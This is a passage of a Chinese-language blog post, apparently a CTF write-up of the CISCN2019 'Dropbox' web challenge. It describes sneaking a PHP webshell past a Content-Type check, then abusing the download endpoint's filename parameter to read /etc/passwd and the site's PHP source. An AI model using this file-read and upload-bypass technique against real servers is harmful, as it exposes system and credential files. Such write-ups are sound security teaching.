@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Apple.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Apple.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wuyusanhua2021.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="注册账号，登录，进入一个网盘管理页面，允许进行jpg&#x2F;png&#x2F;gif文件的上传和下载，上传一句话木马然后抓包，绕过Content-Type验证，即可在列表中看到上传的文件  这里没有上传文件的路径，蚁剑是连接不了的，但关键在于它提供的文件下载功能，这里下载文件并抓包  可以看见要下载的文件名就是变量filename的值，并且将报文发送之后就可以得到文件内容，那么就可以推测能通过修改它的值，来得到我">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2019华北赛区Day1Web1-Dropbox">
+<meta property="og:url" content="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/index.html">
+<meta property="og:site_name" content="雾雨散花">
+<meta property="og:description" content="注册账号，登录，进入一个网盘管理页面，允许进行jpg&#x2F;png&#x2F;gif文件的上传和下载，上传一句话木马然后抓包，绕过Content-Type验证，即可在列表中看到上传的文件  这里没有上传文件的路径，蚁剑是连接不了的，但关键在于它提供的文件下载功能，这里下载文件并抓包  可以看见要下载的文件名就是变量filename的值，并且将报文发送之后就可以得到文件内容，那么就可以推测能通过修改它的值，来得到我">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123213022231.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123221215369.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123214632853.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123215052845.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220124145611612.png">
+<meta property="og:image" content="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220124150525009.png">
+<meta property="article:published_time" content="2022-01-23T09:10:54.000Z">
+<meta property="article:modified_time" content="2022-01-24T07:14:25.644Z">
+<meta property="article:author" content="wuyusanhua">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123213022231.png">
+
+<link rel="canonical" href="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CISCN2019华北赛区Day1Web1-Dropbox | 雾雨散花</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="雾雨散花" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雾雨散花</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://wuyusanhua2021.github.io/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/sakuya.png">
+      <meta itemprop="name" content="wuyusanhua">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雾雨散花">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CISCN2019华北赛区Day1Web1-Dropbox
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-23 17:10:54" itemprop="dateCreated datePublished" datetime="2022-01-23T17:10:54+08:00">2022-01-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-24 15:14:25" itemprop="dateModified" datetime="2022-01-24T15:14:25+08:00">2022-01-24</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>注册账号，登录，进入一个网盘管理页面，允许进行<code>jpg/png/gif</code>文件的上传和下载，上传一句话木马然后抓包，绕过<code>Content-Type</code>验证，即可在列表中看到上传的文件</p>
+<p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123213022231.png" alt="image-20220123213022231"></p>
+<p>这里没有上传文件的路径，蚁剑是连接不了的，但关键在于它提供的文件下载功能，这里下载文件并抓包</p>
+<p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123221215369.png" alt="image-20220123221215369"></p>
+<p>可以看见要下载的文件名就是变量<code>filename</code>的值，并且将报文发送之后就可以得到文件内容，那么就可以推测能通过修改它的值，来得到我们需要的文件的具体内容，先验证一下，查看系统文件<code>/etc/passwd</code></p>
+<p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123214632853.png" alt="image-20220123214632853"></p>
+<p>成功得到passwd文件的内容，现在尝试直接查看flag文件</p>
+<p><img src="/2022/01/23/CISCN2019%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADay1Web1-Dropbox/image-20220123215052845.png" alt="image-20220123215052845"></p>
+<p>显示文件不存在，应该是无法通过这种方式直接得到flag了，这里先把其它可能有用的文件显示出来</p>
+<p><strong>download.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>) &amp;&amp; stristr(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    Header(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . basename(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看见对任意文件名中含有<code>flag</code>的文件，想要查看都会回显<code>File not exist</code>，这里其实也是在提示flag所在的文件名</p>
+<p><strong>index.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileList(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面两个文件中均引用了<strong>class.php</strong>文件，推测这应该也是一个关键文件，以同样的方式查看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span 